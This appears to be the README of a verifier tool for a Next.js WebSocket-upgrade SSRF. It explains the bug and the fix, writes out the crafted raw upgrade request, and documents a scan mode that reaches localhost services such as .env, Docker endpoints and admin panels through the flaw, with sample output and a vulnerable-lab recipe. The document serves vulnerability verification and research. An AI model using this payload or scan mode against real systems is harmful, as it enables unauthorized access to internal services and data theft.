# verify-ghsa-c4j6-fc7j-m34r

In-band verifier for **GHSA-c4j6-fc7j-m34r** / **CVE-2026-44578** — Server-Side
Request Forgery in Next.js via WebSocket upgrade requests.

> ⚠️ For authorized security testing only. You are responsible for ensuring you
> have permission to test every target you pass to this script.

## The vulnerability

| Field | Value |
|---|---|
| CVE | CVE-2026-44578 |
| GHSA | [GHSA-c4j6-fc7j-m34r](https://github.com/advisories/GHSA-c4j6-fc7j-m34r) |
| CWE | CWE-918 (SSRF) |
| CVSS v3.1 | 8.6 (High) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Affected | `next >=13.4.13 <15.5.16`, `>=16.0.0 <16.2.5` |
| Patched | `15.5.16`, `16.2.5` |
| Fix commit | [`c4f69086`](https://github.com/vercel/next.js/commit/c4f69086cc8dcbd81b1dbc321c98ea874d90d6f8) |
| Not affected | Vercel-hosted; `output: "export"`; deployments behind a reverse proxy that does not forward `Upgrade` |

### How the bug actually works (verified empirically against 15.5.15 vs 15.5.16)

1. An attacker opens a TCP connection to a self-hosted Next.js process and
   sends an HTTP/1.1 WebSocket upgrade whose request-URI is an absolute URL:

   ```
   GET http://anything/<path> HTTP/1.1
   Host: <target>
   Connection: Upgrade
   Upgrade: websocket
   Sec-WebSocket-Version: 13
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   ```
2. In `resolveRoutes`, the URL contains `//` (every absolute URI does), which
   matches the "normalize repeated slashes" branch. That branch returns early
   with `{ finished: true, statusCode: 308, parsedUrl: <mangled> }`. The
   normalizer collapses `http://host/path` into `http:/host/path` (one slash).
3. In `router-server.ts`, the **pre-patch** upgrade handler ignored
   `finished`/`statusCode` and only checked `parsedUrl.protocol`. Since the
   protocol survives normalization, it called `proxyRequest(...)`.
4. `proxyRequest` runs `url.format(parsedUrl)` on the mangled URL, getting
   `http:/host:port/path`. `http-proxy` parses that target, finds no host
   (`url.parse('http:/...').host === null`), and falls back to its default
   destination: **`localhost:80`** (or `localhost:443` for `https`).
5. So in practice the SSRF lets you make Next open a WebSocket upgrade to
   the **Next.js host's own `localhost:80` / `localhost:443`** with an
   attacker-controlled path.

The **fix** (commit `c4f69086`) made the upgrade handler check
`finished && !statusCode` before proxying. The 308-normalization case now
fails the `!statusCode` check and the socket is closed instead.

### Why a callback-based OOB verifier won't work for this CVE

The proxy never reaches an external host. If you set up an interactsh /
Burp Collaborator / webhook canary and expect the Next process to phone home,
**it will not** — the connection goes to `localhost` on the target machine.
This verifier therefore uses an **in-band signal** read from the upgrade
socket: a vulnerable server returns a recognizable error body, a patched
server returns nothing.

### Practical impact

The SSRF target is restricted but still meaningful in real deployments:

- Sidecar containers / reverse proxies / admin panels co-located on the same
  host that bind `127.0.0.1:80` or `:443` and trust localhost-originated
  requests.
- Docker socket exposed over HTTP on `127.0.0.1:80` (uncommon but seen).
- Path traversal into any localhost HTTP service with attacker-controlled
  URI path and WebSocket upgrade semantics.

AWS / GCP / Azure metadata endpoints (`169.254.169.254`) are *not* directly
reachable because the bug pins the destination to localhost.

## Detection model

For each target, the script opens a raw TCP (or TLS) socket, sends the
crafted upgrade, reads the response, and produces two signals:

- **`verdict`** — whether the bug is present.
- **`impact_confirmed`** — whether the SSRF actually exfiltrated data
  (i.e. a co-located service on `localhost:80/443` of the target answered
  and we got its response back).

| Response | Verdict | `impact_confirmed` |
|---|---|---|
| Contains `Internal Server Error` | `vulnerable` | `false` — bug proven, but proxy hit nothing on localhost |
| Starts with `HTTP/1.` | `vulnerable_proxy_succeeded` | `true` — real response data exfiltrated |
| Empty / clean close | `likely_patched` | `false` — also covers "not Next", "reverse proxy stripped Upgrade", "Vercel" |
| Identical to no-Upgrade control | `front_end_intercepts` | `false` — front-end proxy short-circuited both probes; SSRF never reached Next |
| Anything else | `inconclusive` | `false` |

When `impact_confirmed` is true the JSON output also includes
`upstream_status`, `upstream_server` and `upstream_content_type` parsed
from the leaked response (useful for triage / report-writing).

### Front-end proxy false-positive guard

By default, every target also receives a **control probe** with the same
absolute-URI request line but no Upgrade headers (`Connection: close`).
If the front-end returns the same response to both probes (status line +
size within tolerance), the host's own front-end is rejecting the
absolute-URI request line itself — nginx 400, Apache 400, CDN edge — and
the SSRF never reached Next. The verdict downgrades to
`front_end_intercepts` and the JSON output includes `front_end_status`
and `front_end_server` parsed from the proxy's response so the operator
can identify what is intercepting.

This eliminates a real-world false positive observed when self-hosted
Next sits behind nginx/Apache: those proxies reject the probe's
`GET http:///x HTTP/1.1` request line with a generic 400, which the
detector previously misread as `vulnerable_proxy_succeeded`. Pass
`--no-control-probe` to opt out and see the raw verdicts.

## Requirements

- Python 3.10+
- No third-party dependencies (stdlib only)

## Usage

```bash
# single target
python3 verify_ghsa_c4j6.py --target https://app.example.com

# multiple targets via flag repetition
python3 verify_ghsa_c4j6.py \
    --target https://app1.example.com \
    --target app2.example.com:3000 \
    --target 10.0.0.5:80

# from a file (one target per line; '#' for comments)
python3 verify_ghsa_c4j6.py --targets-file targets.txt

# from stdin
cat targets.txt | python3 verify_ghsa_c4j6.py

# JSON Lines output for downstream tooling
python3 verify_ghsa_c4j6.py --targets-file targets.txt --json

# Enumerate co-located services on the target's localhost:80/443 via the bug
python3 verify_ghsa_c4j6.py --target https://app.example.com --scan

# Same, with a custom path list
python3 verify_ghsa_c4j6.py --target ... --scan-paths-file my_paths.txt
```

### Scan mode

`--scan` probes a built-in list of common paths (Apache/nginx status modules,
health & metrics endpoints, Spring Boot Actuator, Go pprof, Docker daemon
endpoints, common admin panels, leaky config files, Elasticsearch routes,
etc.) through the SSRF gadget.

By default, scan mode runs one extra **differential baseline** probe with
a random non-existent path per target. Subsequent probes are tagged
`DIFF` only when their `(status, body length)` signature diverges from
the baseline — uniform 404s from a "found nothing" upstream are marked
`noise` and don't inflate the hit count. Pass `--no-differential` to
report every probe that reached a service (legacy behavior).

Output is grouped per target:

```
=== vulnscope.local:3030 ===
  baseline (random path): verdict=vulnerable_proxy_succeeded   status=404  bytes≈500
  [VULN+] DIFF  /                              impact=YES  status=200  ct='text/html'
  [VULN+] DIFF  /.env                          impact=YES  status=200  ct='application/octet-stream'
  [VULN+] DIFF  /admin                         impact=YES  status=200  ct='application/octet-stream'
  [VULN+] DIFF  /index.html                    impact=YES  status=200  ct='text/html'
  [VULN+] DIFF  /server-status                 impact=YES  status=200  ct='application/octet-stream'
  [VULN+] noise /_health                       impact=YES  status=404  ct='text/html;charset=utf-8'
  [VULN+] noise /actuator/env                  impact=YES  status=404  ct='text/html;charset=utf-8'
  ... (53 more 404 'noise' paths suppressed) ...
  -> 5 differential hit(s) / 58 probes
  -> upstream server(s) seen: SimpleHTTP/0.6 Python/3.14.4
```

`DIFF` rows are the real hits — paths whose response diverged from the
random-path baseline (different status, different body length). `noise`
rows reached an HTTP service too, but produced the same boring response
as the baseline — typically uniform 404s the operator doesn't care
about. When every probe is `noise` and there is no baseline divergence,
the bug is still present but nothing useful is listening on
`localhost:80/443` of that host.

### Flags

| Flag | Description | Default |
|---|---|---|
| `--target URL` | A single target. Repeat for multiple. | — |
| `--targets-file PATH` | File with one target per line. | — |
| `--probe-path PATH` | Path used in the crafted absolute URI. Reaches the target's localhost service at this path (logged on a per-target token suffix). | `/x` |
| `--scan` | Enumerate common paths on each target's localhost service. Sends one differential-baseline probe per target plus the path list. | off |
| `--scan-paths-file PATH` | Custom path list for scan mode (one per line). Implies `--scan`. | built-in |
| `--no-differential` | In `--scan` mode, skip the baseline probe and report every probe that reached a service (legacy behavior). | off |
| `--no-control-probe` | Disable the front-end short-circuit guard (extra no-Upgrade probe per target). Useful when targets are strictly known to be direct Next processes. | off |
| `--timeout SEC` | Per-socket timeout. | `5` |
| `--concurrency N` | Parallel probes. | `10` |
| `--insecure` | Skip TLS certificate verification. Required with `--proxy` when MITM'ing TLS. | off |
| `--proxy URL` | Tunnel through an HTTP CONNECT proxy (Burp / mitmproxy / ZAP). Supports basic auth via `http://user:pass@host:port`. Requires Python 3.11+ for TLS targets. | direct |
| `--json` | Emit JSON Lines instead of human text. | off |

Targets may be `host`, `host:port`, or full `http(s)://...` URLs.

### Proxy support

Tunnel all probes through an HTTP CONNECT proxy for inspection in Burp /
mitmproxy / OWASP ZAP:

```bash
# plain HTTP target via Burp
python3 verify_ghsa_c4j6.py --target http://app.example.com --proxy http://127.0.0.1:8080

# HTTPS target via Burp (Burp MITMs TLS — need --insecure or install Burp CA)
python3 verify_ghsa_c4j6.py --target https://app.example.com --proxy http://127.0.0.1:8080 --insecure

# proxy with basic auth
python3 verify_ghsa_c4j6.py --target ... --proxy http://user:pass@10.0.0.1:3128
```

The proxy sees a `CONNECT host:port` followed by the raw upgrade payload —
useful when you want Burp to log/replay/modify the SSRF probes.

## Reproducing locally

You can run a vulnerable lab in five commands:

```bash
mkdir vuln-lab && cd vuln-lab
npm init -y && npm i next@15.5.15 react@19 react-dom@19
mkdir pages && echo 'export default () => "ok"' > pages/index.js
npx next build && npx next start -p 3030 &
python3 ../verify_ghsa_c4j6.py --target 127.0.0.1:3030
```

Output:

```
[ VULN] target=127.0.0.1:3030  verdict=vulnerable  impact= no
        snippet: 'Internal Server Error'
```

Repeat with `next@15.5.16` and you should see `verdict=likely_patched`.

### Impact demo (real data exfiltration)

`demo_impact.sh` runs Next on `:80` (so its localhost-pinned SSRF target
*is* the same Next process) and reads Next's own HTML back through the
bug. Requires `sudo` for the privileged port bind.

```bash
LAB_DIR=/path/to/next-vuln-lab ./demo_impact.sh
```

Expected output ends with `IMPACT CONFIRMED — SSRF reached a service on
the target localhost and read response data back`.

## Caveats

- **False negatives**: any reverse proxy in front of Next that does not
  forward the `Upgrade` header will mask the vulnerability; the script will
  report `likely_patched`. Re-test directly against the Next process if you
  can.
- **False positives**: the literal string `Internal Server Error` could
  theoretically be returned by an upstream proxy on its own. To rule that
  out, re-send the same payload with `Connection: close` instead of
  `Connection: Upgrade` — a real vulnerable Next stops returning the
  Internal Server Error body in that case (different code path).
- **HTTP/2-only targets**: not handled. `next start` defaults to HTTP/1.1.

## Responsible use

Test only systems you own or have explicit, written authorization to assess.

## References

- Advisory: <https://github.com/advisories/GHSA-c4j6-fc7j-m34r>
- Next.js v15.5.16 release: <https://github.com/vercel/next.js/releases/tag/v15.5.16>
- Next.js v16.2.5 release: <https://github.com/vercel/next.js/releases/tag/v16.2.5>
- Fix commit: <https://github.com/vercel/next.js/commit/c4f69086cc8dcbd81b1dbc321c98ea874d90d6f8>

## License

MIT
